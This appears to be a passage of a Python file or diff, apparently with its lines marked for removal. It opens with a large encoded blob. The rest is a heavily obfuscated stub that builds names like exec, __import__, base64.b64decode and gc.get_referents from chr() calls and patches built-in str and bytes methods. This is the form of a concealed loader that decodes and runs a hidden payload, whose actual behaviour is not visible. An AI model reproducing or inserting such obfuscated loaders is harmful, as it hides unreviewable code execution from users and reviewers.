xEF5ZH6keohCmF4>Ol1A1O(Ae(kAr3wFnH;i&=E!1}Nt(-IR-QJjdS`GAJw6B5`hkq0V;bUEc0g9G9ov05*Lh6~-|2MJ(#cY>Va&Am`C4mUpQ)in1EUF<O-VY3m0^2n-*R`~DcVlyIxp2@8_yMzG?i?2!z#^XqkJNPif&q2sOVkHB6O3or`pQ~zRo;FL4!#`k(f$3OV$Wan0N?4q&Mj8lXd7*DFfu$;W8l$Nq%Xn|v!LFxin~3Le_Is55f6jT90DkstHXAYzJc(0@QgiZ19h1rE6Af;9I>&3P{-RX(8>|sJo(vMQw}syOGCdcoDFuEC9pmy5X(>P3k{(g4S$Q`4=wK-R#dlZ8GyUTT5P24W2#7zGza;P8TpzkZ;hn?*KJL3rhG$}!v4QhYWO44IxvBiDO(7#11N<0xnz1Te>j6en8m(D1}Y(bk3<E;`hCv}-*C>?&u~ZrSt5Q-P!+zf_ph=;uR=IjUT2S)kL#&nit3X{#X@K2w4#bIXPwEun{n;stT0I~(sQ|HNI7Ywo9Imnyzhzm2qNzfJ}9cuG#}rj!b1$YISTQn9N*Q&CwQ5zxEEdY8-Xaua2WUiA;9N7(Io4ve`7ui58+S0G)@F}aEoHPmu|_nvBqJHL()>#X=+9aq=T(K-6giSB-HR(mD>6G@+(M)9aeJ2VycO}>keX&ebBk!!S&S|Sj4|i+sIx6D9ZHqL0b7?h>wz{D^zR?wKqo7APk6hHtjtD3OSqf;*+QHkC0PAA5BQ5L<VNbhJKx5<}JEAyd)#iuFBAgbYpmV0RIX}rQy2J8a_LeqRWN;E(gIuI@9R{CUk1l>=&+rY{EuBhyxKliLj0yhNtKvRz8d@sX&V|nWjdZZ-<yFtlU9UYO^l7)_#kmDAH2ArB8iTqL;R522)Q)0g#O&NmWJ<5%<S#K;lS<I2Fe;pd*hI;`7IfntRwpaM$YB0B@DYvp+zK{$~zIx4~79j(L@E0qMYWKIk}msv`5UX4<*khD=Wp4tT|kJ9uM?Uh0SD7w+LCuHAh5zjuW@(>TO1b8;d`4_+GarJ}B&^Fp$Fo_Qbt4-@Bhk$E(6d%fK`<dN-T?4W<Ht$U<vt$^`FqpIvsrg+nI0*J^hVDdkqPwqF+*-=+SBhk7q^GwR}Ci~M0Q^+PWsJNG-dN9Tky`TJw!?UG@Wv6_7kC3L0A+>J~;FdEGAI@}3KRRn=e4kji?d?lGba0r2pcUCs9}qxL1s!B6iJ++GCLP==wRZMYZi&j1c>K-vzbUT;??&iLX^&Q7W{rF7N~wN~z0S1JZYm+NNYqhc>{KCbBrtSt;u@*Q%H|B0fj&Y$ejwAVJ1`-RL~D<<P^5JEQWuGFSS>|9x6+^LU!9JpXJ+%ET)?J-;<US{%0*@4Ym9N^D5bvP!Y%;ln8>>v9!Nk-#X9#;CS~BIaSs$usUGcY3GZ~$u7r1{MeA1uF5MsQp0tq4|ATIF@-jc~e94L;LvM7(`Ba;IpQdQz)4xk@QfVyT9C88Mb2F=_%Ci;N)hV{>ZwY@SoXRcvv?!)ZfmYMEoz}s(2m;d{fVIbFO5LVH5##iBQ@0>n;?pI3jBx0hh0t;-U#ju<E<X`!zn1tE925o8$1QK~FPZcN4T;0~swn-dg=JguVA?b~R{$Ijz^n*fmZ~xAGg^v~Pfdf?By!zx!xa6KPRtT=>^e=SQn*5{!Yyv>f>?Fy0gBpAtR=bbBBPQz!c&&S{-$+hNk?li`y7bd4y*-xOzq0di~NVGuq;NMFtO;!tutgdgGav~w|svaaff|*K)^SRtQ+WYH4~_(af{$erTZ<2j;S+zj+jGw?KtOolnR|B<P*Q|z`d4F^q-Loq}CS_%7KhiHxw2OSb4n&X<I3t-~a>nZi3=em+T-IeDrupj+FCJ=7}sW3jkkG@QbDv1&bLSK^1lF^JMf1&C%$>=uKYhyyI_BN)^MKn&>l?P#TX2Yw6cLgvdPj1W=702PwfxUSY*Qp%2)R^qj{(^#mXCuZrh75A6#PA<e7f{N3>cPWk8jysdP=Cs59k>BhSxehKNk<bei$u4q04vQNvPHZ{~1huH<=&*vz+_+O4eVS*oTGtEM3O%b4x$2Nt9utvfi-3d;8IaX;53aGQ;djQoBzk_HJ&91G@c=0V65z(t=>=v7`!QUW-tB6F55qeZ3sTv9Gop&3mAgr9GxKAU2GOqagjKt>6Q5BiWFXwhxKI#=4K|pOMEttW81nZR+I9g-wR|_KsSprFP3bV@&f^`0P(VAc&q3SH$qQ?%UYkl=p#q4ud;rZVjxCR={-Mu&Fv;`|e6Zn9-T~yncnojosLT;a0Ezs#ERkhn>QNuK;0RagLXj=%Hh08R?F21Ye`U&WCX*?>F&H~8XP7BB=N4?z!OyaYcZtR-9Ak%o`VIvYt7Zqq#R%B=y<jWl+huhZFp;#kIuo{n4>3@qv_3c(Dg(-y)53Awskjd(}#+(n4&U#0p;ib`TYH$JB7`GqfV<V_qaP7JsT1VcFtaD*{D&|raR0Y{|6P@NP$i|tW%!qa`-H%kCo3DXgR8V(V!TXkVD&)UKrFim$=4vK~$juDeg1njChWL|AJi<a>O32N^#8-~|Amsq3;hL)@k;Bk>ORFhar-D-&ue9ANHYg-8HaGnzT5n_@1Tb{Ac^9p5#}jhWUe2xozssQS%UBj$vpVk^7~zbT?f_m8L|{_SWRs==XKD~CF154mi9&e@^%Dl)s}9Qo(t<rNGt^mDul-(EDbbE#?_N+((ePdGV79sGO5&Cm$%$0?Fa<y?A)ff2r8rzb!yx}6h0*+Y8oEsTdFOI+7oRu7xn0)+W#FuO3m-c7t1#;>P-r|1dnrC|{=HrV0u_CUb74z`0mi5BFmmc<wIms^a(+6b60j2v7b%=^EiA8a>j)c$NRdb(HX;*$x%_T%J#UJT2F$Rq=S%RqoOki?MLlG<|A-F&&%d%XM;gajr=YyGmPoR%(kc=P$)UkF{J5+ws)dUwh3tZZDFXxUXz;mN<+Sv5VhT0?AMI7YRC-c0tj1Udxp`}8;HFtZ9e^Ss<<YB)1Gr3mb=F1WvZ#}-0@u>&OeS;Tc2Qa*-WfJ-qbfP>L-a}>Von!aP4JqEL8XOGc{<=6=12U$IPg)x6ub&k)eYBnbKr^1`&(#2T};p{NEP~)xn7bQY^v8F`%31SJQFmGV!POkAKJO(d9U32Gh2XF=jtqee-sEy0AV9JroB9<M_92h&G=Ug3sDCQbqfK>=_d&RkxF<Re)w>j4Pq-7vY2<#<qAoC&aEOzZCgDFW9mU>4<fN#2rCDbkNz}BC57TzUQ``>Ge{n6C)S_1E5_ug9<nh%9oxq?iWgPk=*pYedO}0dtwO9ymQ|yqsoB=xWCKdzP@}0izLNAq7F}|=X9M%S<3*xV<Kumt)~Fd<n6J}i>c`c(hW0SSLYJOIorbvSfc78^P6mecFc%U?Q1`*?0`6IlOhD^Yju=U?4^DqT#J8o&W3HOH%C=B}A6oa)C`w1dRs>p}En`Bo6u~nd?ncKKc{Nj%jeyGlAdU8yNjc7<97T}&`73+YM){w>*+LOxs|c?-@WD$a^M_s6+l%8)BG4*7Z+M{3#1JlDZ}Hp^<De%*tC2dci=e;IryxP$qKF=1SC^t0iuBy!#?%H9G{=eA<u0Y43`+aJMwKOXaa{~b{v|g;0MmYZX6%mt;$A$511=_%LHuKMF(0_~5hae26r{O0LDUacALwBKffSuUrG{)J`2|?wC;yok-t7L(XlpOUY%)mv9D;e7dX5N%{KaR#ODf(Sh9>{sP2+)N!1#`wOaS})BR&;qlLII)wmCTj;SGPyTh0&7P%E{*D*K|{E3owQ>etAwMWx^FAA5}Bw*8=c2nP1}<sm^ULeL=<cofEo&%!B?1%BaLYP@M;YrPugW}s8Fw77-;6>+qbwx2C#ThT0=LTn<I=A~Jn-Cpr0$(WGL6<41csT7|^6Q5h~SLF%u5UGLSrJK*q!*-C<x6sgl=`-Z-LO<L_E`SZ!*{jZp()K^NMVY3rjS<yE%)Z}q9($){duP?RrJZL<Hz+eY%kJhwo9`d~s>tvX0)Qtp%!uQTCe@8fQn2Ta5_(NDxOUd@+D?E8pByr3VkHbfZQ|E_q_-voMA2TcqH|ZH*m^D>{WZRLmg4c?qHP>2ZR8c1R7AY78;fHLj{9Rxodnvl{Nr3rkm<OWQJuQks?@~N@ZytjQ?GU7Ln_yV6gF82U{#Dt*JuvXsK5^y>WF2_3m_|X5;X69&1ft(K4o#OxbOTib(zOyYW9fl6;eKy{3nx9F$B>LDH|rzj~HE_Jn{nSpVnLTl?u{R#C9@)hM74m>jPbpYp58{C%PnInPoT&7g1pn#mn3k;t{ZhdDe&8{)#xqs87Vj$s&7YnH?yoMjU^XKf$sKt76aic-l=NjnYApk^Srh1+%<RQ;YRnPCYR>N$^}X8?S+vHK4y+!c5!K$qX)_bd5f^?vR?Q;@LSq$Cpl23hby5By3BCm(cweDY+IeRL=;Tak;1|KD$J?cu@wDRDwdJ&}~ez%@E+a(0$AocTeW{vL$3TV-Cni!LyO(Bl-K1+n~D00O{N8vdcmNIp6#Y(&dWh3T*F)b5}4LZ+Re(m-ga;4RsMC>3Zc(q&#|R7HLBf`eZ;?OPjjq^%Oj|#Z4d0-A@CvFLxIjx!Imz5GQ3+LxEv%Nj3A04mH6juF6jsX(FB37=L5V;a{+M##)*P&G``7VA|HnUF^B|&K5E~{!tFj^7+g)h3?|D`TR-&KzJGA@K`Xo{zm<yggUdo8ZH6Ib%@lv%uWzsrYX4L@S-(7{MdpKA%V~x1gMJRW_=}(i!T_Tf^?{IovpWrt1KK(Kj4wD?deY{B#T)Z^677D5zK&VXgyzRS3ZA!kD?M6>x9cWX{W0*1q&}NmP*PCFr52&+%6XVE$TmT3Q`m!C+S=uImT)o$cW?T7Yu#bUTPb122ZtC<bR=><Vx@RKQ;UK8HCpa(<k6qX3;R1;IyPVVVmtSWXE$>iV0ydhJLEURP-hC`if?#o?AiX0qi#xq8Ul#k}UeSC51R@1Z%D1e+(%?4t)CZ+;Td1*WEBSykhOWQ!C7W?;CjNX1cyhMH6X`ykQhW4DY+7y+#Wda?9T4`Jdm?FMrr73d8hVW}$fJ@>a%1xixxY8=yuROzaULN$7x2-3K5T_CwMG9H`WTt?sPUBN8MYa@dIKi-;i+K|@0B!Q(R=XoY}thW`5#2K>NLw{5^eU<5W~0y2&$4Fq<QdJ}?BJ-)aEM}XDfeU8=JK*Y|%lRziC9O^Z!{S!t>C=2F-<$kr_bKY_9MULYJ^jOq0YeYlt(Rk0Pk=?It2!m{K9=1vv&J>A%BBnYr7(UXohc+?>k9|ecJ@93XZX`*>829CwIWdH?;LwVYZj(^TFuAI&HGU6P0)4!SY$h1sH%<p486a#z{q6`9dP10}!8W^WjC^?dn8>w0ahwJit5!?>(0*6?f%9Cs)n!ul37K<^!Bm&<qm<aa^_l4x<Ij#k0I-E3X^Iy<mjK$fK-(P!_Dm$*s7R*VQ_P2@?%9N@STG?odzrO_>9knTlZ4TYttcwShva$OQHQX*DK?c>(EEf~Iit_gmOlF(4xwzzU@W=h^Jxz8cNHAqy~S7^Hw*PS4Rb__V2Sqz?v5PyU@-`BV0WkTt@6YGDHC`f^v^fsh%>E^Hz~)F%^$)VCfvBb>-m@TO%67EEyD`)@N^noGLo_j;MU)N*c(<-lpVPhw)J{JR^Yivw;CH%hBd3JYEFjNb#u$S#z_r`g=Ts07<=<r_!?sy!9)_vmM4if{OGbwMPFU<OTB?^N$qx=qR0S`?I(V_#^z!<@eB6J0%tW?QMM0%2^*V-*DS>dbPr{Pq>^aGmM`Fj%?r!icK!rfa(UjrUTMef$G%;qCR39W02<MNhN@fd$!lTAxAW`MF50xKBV-;(=~mKO@JD712q~QYtj{PZZ&my>45G#t+K`G6g_8nR2n%XZDX0qtWn;j`pu*m}y|OSDd4U~pqPHSwa5rcUiSYp=QREePD37ve@yaj*?=$aHR=q<3ZRX6^ks@*)be=paRcx0R72GRcN@pukM0@QBAuEi7I{kn*)6eNtHp1nt04B9i*6!mbho9UKCin^z=r4C1MU73ar#zXDG$@Nbb(m&Rie!9;XUm=}|3&E3T5-gL?bEMGq_}FppDG&`*67^FhsnOQ@5T6u#?*vLzvcM(uRaBtbG-y^d(vr3)ESG-gDda>A_rV4@i~uw%SRKB#NCX`!Y9ZS=>CHuk78Aj6*r^E(^`PKU@pkJ97QOW2wvnI+gar3=TUd#TB8g=g9<JX&nd?iq_H;;4#5>5`98ysq@7SBtgTY3h^s&`hexMtb(+T2kqg0+d|=+%KJl7OSg)|M`&_f}OISIJJ$ep2?f=nes{Z;0(c0#cOAVCnoe{KaM4|<emUOX;qa7ZD&PrYZL|9rNDn{zj3_-#vorrP&8^ND|!1zl`nvm%8&_gkce3qjsn*ZRg<$C0(scl^~sxyN2U`N&Kh5Au=?yH9-x%sCFX4ctg37I!gE+&IuTk`ovrb1}@e~36{uq+-*8l<Wn<f$ok_kKli1oDb18XvLsfidB4zhd;1mD=wr2}{2%l%kI{u+rTrVYv*QyMx++IrU|-<0h)JcY9?e!V86tW>8g$aX%7qPPIcM=V6dboW-!t=jj0MhBS7&Wcf<}MlP$1p`iY0#NQ}j@;<A$t2#}6Ze@%C0qw&1%}sE5Be?qrD?sH146m(lyyK|^L<Ipl)^CVJ0<rLzb&fOgickt`ZE!>2N;8C_W!4#T1Xq4O-m{$hnJ~Es|6HN+S0eRydCp2?C{gVZ6AMd;kiqiv>-C|NT7-8^43WZc+yJzlh&Rn~z<_)4FgBOI?t8@2Pj}l#l$ml2JN#0tOICTTBPPx&7M@viyqvu359A~S`_sbON0Cbof_Zaubm&Bw0px8lQsM1%J^1pL8irqJ@JB9zGjm<>*qZfaW&lX$VN`8r6b(4gV*x8FJ!ZIQaLBo^#6f4QWR(zyZuVEKEVHgl*N~3^)Sg|$q_l#TaXAJ^NOz)wG0cE$i|C9j11H34^Eqxf=u_~e4>y5fEHyK>TUvEYB1@1@tNu^Kna$Sx52OK;ooXie%AA1=$l*~jMJ?DgBx}+0X5?86%tkq^uGHuVJ>^ObZZI)Q^#aM>`l3y<J}EZI>dQb21dLLN%@v9IWt?3TF*Z%s?*k-rH!`d7JJkT(14Mw_;7cCzq5$zH_YvZ+wF6M5g|2t<LQw9@bn4=<JS-zSaWI!w=?!?n2FW<NF=hSajDB?(>>f~Pj)n;Ug&?*^9Ff;VrbS;UYB%+ybH13<A3USjwj<-$$~xG*w-V|dka`~{sm&KSa-?%D#Lu|sm+9p8`Q|Mf@YHPHC*=#}ouh}mhg%H1R|vM82$pK=2Vxz`3GpMpbj+tqho;xL-=r+qX+JV%MVz}v7zn}(`~~UWSMyk+^Z^m_f8KUG7X5lEBkDX+$o}N_)&c*3!s+_8K_W^H=kPL6ocZ{Ojwj%@#Q)acvOXN=KWv+k2K67iu7T$H3(mnqOs82VRQo7<dgsfhfHO$Y5(bM9DcZHc&s-ebPi+CUnR@xq8kV_<YVm-!!|*b??_5MYDn~5ssfxL-jx7%6KK$#91sUUV``gyLNu{Lxu+aH-q607kJY-<Ccv51?<u^ZqDv5b%t{BcY)nGX7+fmo>1s%=XPGxsmYDl{+`7L^okp4_if5wi47>7`=cK}z6i*not9s;+9tm?j(3-k3GLMBcSq#{kr$G-sHARUYcCe4>kKgW(ZO#lc}!pVGLpah&<1@YONqSfL^FOg9ZE-`ut)@;A{M2NRIP%BFpJ;2WcRree3S|nNT9RtY(`orzX7J<Oo)FVdnL}y5eg2I`GDHMa)x&@?IY0wX|h8qu-1rezzE5uzHsjmRVYhAfF+uG*j1^NOL{v1iS_TLm;Pm@|lV1g4%UoA;ZyBW&IKK{O+&<1t*hFmouP6Mt4WqN_A%P-Eg-*_YM%Ha-FWBV#YR2WF?kemzK9AFjTBC9WhJH5fe)U&rU_f{@{V1QbYGg1(<zZ+r)do(8VmF|4UmuTL2WIgg@>@f(QGL;OriEw#c?1x^fNQ{BEilsu!os{@bETp-#6}%0hXYqE1eCM~FhT(a#WPc<Y|4eGHk=(&%oR5=nV#LS^E?1oI7Xi_S-djLipWpV1xDq0hNHAfK1Y?swZrfe@R0-aatDM1%6F^RODuBRz?5lOJE!5?ksaMpk<I!rC_r7t8=ol6YyZfkoxy9U+4<d*mSbyb`O27$>#?xE;xLm*_x+NJ@KVJx83l7QakNG3#iFV4*zFT0M;Z|e*3PEjs$l!rQVT?Q{5AjbC0;$+a<KIC=A$tLgJ@G^*|JtV62ygI=kp0%$BKc7|QHUgK*Zb=Fr3M`7TYX%ScK(g!qteohcwY$!+ebMRT==>^t18FW!Hg0c)6$u-0MJ#_om-2{W|9V8TM_^e+^FnFs7wH`l-0IRMMbI=o(rZ1b_87W+N%ZH3q}^RZVYE9r+!FTlq1B|nV{;>(6imxxP4F{Az$jrffZrr0VS)a2+d4;sV}s;+oMR(*5s;@m9<fvr|zgm&uGVae1E)ciO}5hM%HCE3EC0Kc<0cUT>!Jg0K8Ay-XyZ*i%g&Yr6_*?!nq94#U9ZfWg|IPDm@_&FoMmsK<q_zd+#PW{73~f7a=9W-ts8>`b`Pt$)3!h5@c)EW+=1}ou7$759S*@)9zU-n94c!=g9VMJ4G(UX^2C>K(L7ca&hPhv6HoJWN5agEs2=5(464!OkSEO?--Ai`aT=5BQ>o!*qS0>oTYA!U_9-;WwI3{!3s9Kbq|AEuQlaCrP!m1j@?@~`zdze&gFIykvGIAW8bvyH9}d%#tHca_mga+Gv3?u`Dt)IcZ(#D&GW%b{xz6)(X;zl_d=&{cQjcJa!Z@5+se$q_8sIkQ39_C<aZgJgvRM3z%ENwD^xpV&Z2)!$M;7I9>J`nXK^-U)!{+HmXU>G8N=}??B?$%)y+PW^F(cpCfPa8!Obvm9qr7JxyL;Y3_K-pNq2v-#(7$=9OoYVpMvPBnv%<!AE~YuK)3gh;OH^~tIE2?N|%lDv@o)DY6QzUd=H>a<<{tZ0AbTci+`9Ql*cJREDUT)=Q&tURAa*Y*P!AhTefD0Rcp3(lXaW8eWbsvXTvX-&yC7eqbJG2e7Z{4Cmh#poIo!Jcej|-GzR}+fpuIh8EaWr+~N>~YfS~LE?TRGSwuZLd<*J0=HCpo6?UFd(m!i^zddj5ABY|u+i5>|Y*)>elJed+eXf#+(TKaG(bIsXhoQIXt8lLQ`IH2|C%Q_z5A>Gv9_v^+<>ib~<~Pbwa0@WFu>MGNpy19*R@@NoNY{_cP$t*;b1#9ZK~>EaFu7<Cp)IJv@B$XYJ{V-G_ITZas*HPb%DZF{UnxFibub-`)QGd7mqkKT0Hpz1k_?PGGlCXq+_`#EN{`J>@+HWyGvEiYF+5E^tb=)wYwpOaBZ?Ce)0@7IWpR?bL{Hsk4G&h)D=E7&^yLxWE~qZL0qD6yK!!$Hf_Gbmmr8G(LpF<{T5Ax<_~B0SfTW^vWX4clHPk}jF1?$HNwaZ?%Mk+iqcr!v0*L)ntvBMO!yJU{KGMt@l%LPZ=aO1YwQsPz$wmL7H2SpUprTAM5yOiR&4#49vb+6XO;{qIoZMZ`;VH?u`4!-3J|+g}dF;gAX?d)&Qg$mS?K{FFfg|b^bbuq<nt6crol0XGZj0sYTsZn>RldlZ*niUv<UAz7upuvl)c9`rRk-g;tDQ$u<|8Z*%pO>qFC!Rw(+;Jh=Ex@MEmLLEFf+3r8U$8N<v(3H#qVzet02*lzRHX_3)?3kP|zTS^$IFEjL`k-QhrMRg@)dd$@}!>8jpH$BL3;#G+RHB$p$bUc#DSq5)(}C-jZAOIMOS0LR*rLuLW@Ru+zFLB6_<R>D&+7W8BMp?S((EC33iHaXnYH`-QIGrwYtA-U=;y_3<l3@n4ONw^ED@8_Ez0{pl98mCWX&xU_Y`X|M<cpe}&t+nU`$7pmUkxjo0&|LlwqJn1D(U3)#<v`+{rZD5}q++Q&}Sv?dv2rtX40K^ihlQ-(B5d)G`o6Ip7lkQJH$>Up<mh%|yW8q|wsw{Z$Bb9}6DBNwHpc0na%Asfg^XxIvAw}#=H)(FTg9)MNwZVh)M-%^Z_y!oiV}}f3smDcf*1T85y?XYDM)R?4l+@a`BoCkVRJ6|La~h)&26!;4K6$>eqoIs_nZkfb(u|A3?DAfxb6MMNiC1sO1FwbYqatRub=R!cqdad$mi}BIHkMjbP=HN#5XwH*lJ&oac}by%-`zirM`bl7Nd}Jc*;naAY3a|tPq~b>0*8T)4k3hokf|PM;_oy7pgeA*+rdUU+{S8AWc+2kQxG0Y^R}}gypP8|fBTg30aO<N>!n>2xWd=!UmH?zUJ{#f-Wb{>@AOW_Zy@Z{097NLK|9TO0Caz@NJl>M#JA@UHby~z7k$7r2gGiPvi5To@Awt"""})
-lIIIllllllIl,lIllIIlIllIl,IlIlIllIIIIl,llIIIIIllIIl,IIlIlIIIlIIl,IIllIIIlIllI='','','','','','';lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII,llllllllllllIll=globals,chr,locals,__import__,getattr;lIllll=73;lIlIll=108;IlIlll=98;IlIIll=97;lllIll=101;lIlIII=103;llIllI=115;lIIIlIIIIlllIlIIII=lllllllllllllII(llllllllllllllI(lIlIII)+llllllllllllllI(99),lllllllllllllll(), lllllllllllllIl(), [], 0)
-llIIIllllIlIlIIlII=lllllllllllllII(llllllllllllllI(IlIlll)+(llllllllllllllI(IlIIll)+llllllllllllllI(llIllI)+llllllllllllllI(lllIll)+llllllllllllllI(54)+llllllllllllllI(52)),lllllllllllllll(),lllllllllllllIl(),[],0);IIlIlIIIlIIIIlIIIl=llllllllllllIll(__builtins__, llllllllllllllI(lIlIII)+(llllllllllllllI(lllIll)+llllllllllllllI(116) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(116) + llllllllllllllI(114)))
-IlllIIIlIllllIlllI=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(llIllI)+(llllllllllllllI(116)+llllllllllllllI(114)));lIllIlIlIIIlIIIlII=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(IlIlll)+(llllllllllllllI(121)+llllllllllllllI(116)+llllllllllllllI(lllIll)+llllllllllllllI(llIllI)))
-llIIIIIlIllIllIlIl=IIlIlIIIlIIIIlIIIl(llIIIllllIlIlIIlII,llllllllllllllI(IlIlll)+(llllllllllllllI(54)+llllllllllllllI(52)+llllllllllllllI(100)+llllllllllllllI(lllIll)+llllllllllllllI(99)+llllllllllllllI(111)+llllllllllllllI(100)+llllllllllllllI(lllIll)))
-lIlIlIlIIIlIllllll=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(lllIll)+(llllllllllllllI(120)+llllllllllllllI(lllIll)+llllllllllllllI(99)));IllIllIlIIIlllllII=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(95)+(llllllllllllllI(95)+llllllllllllllI(105)+llllllllllllllI(109)+llllllllllllllI(112)+llllllllllllllI(111) + llllllllllllllI(114) + llllllllllllllI(116) + llllllllllllllI(95) + llllllllllllllI(95)))
-lIllIIIlIlIIIIlIlI=IIlIlIIIlIIIIlIIIl(lIIIlIIIIlllIlIIII,llllllllllllllI(lIlIII)+(llllllllllllllI(lllIll)+llllllllllllllI(116)+llllllllllllllI(95)+llllllllllllllI(114)+llllllllllllllI(lllIll)+llllllllllllllI(102)+llllllllllllllI(lllIll)+llllllllllllllI(114)+llllllllllllllI(lllIll)+llllllllllllllI(110)+llllllllllllllI(116) + llllllllllllllI(llIllI)))
-lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lllIll) + (llllllllllllllI(110) + llllllllllllllI(99) + llllllllllllllI(111) + llllllllllllllI(100) + llllllllllllllI(lllIll))];lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(109) + (llllllllllllllI(IlIIll) + llllllllllllllI(107) + llllllllllllllI(lllIll) + llllllllllllllI(116) + llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI))];lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(109) + (llllllllllllllI(IlIIll) + llllllllllllllI(107) + llllllllllllllI(lllIll) + llllllllllllllI(116) + llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI))];lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(100) + (llllllllllllllI(lllIll) + llllllllllllllI(99) + llllllllllllllI(111) + llllllllllllllI(100) + llllllllllllllI(lllIll))]
-lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(116) + (llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(lllIll))];lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(116) + (llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(lllIll))]
